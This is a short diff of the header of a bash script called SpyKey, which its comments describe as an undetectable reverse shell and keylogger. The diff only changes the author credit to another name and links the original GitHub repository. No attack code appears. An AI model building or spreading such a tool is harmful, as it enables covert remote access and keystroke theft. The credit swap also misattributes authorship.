@@ -1,7 +1,7 @@
 #!/bin/bash
 # SpyKey v1.0
 # FUD Reverse Shell (cmd.exe) and Keylogger
-# Coded by @thelinuxchoice (You don't become a coder by just changing the credits)
+# Coded by @jayrajk11 (You don't become a coder by just changing the credits)
 # Github: https://github.com/thelinuxchoice/spykey
 
 trap 'printf "\n";stop' 2
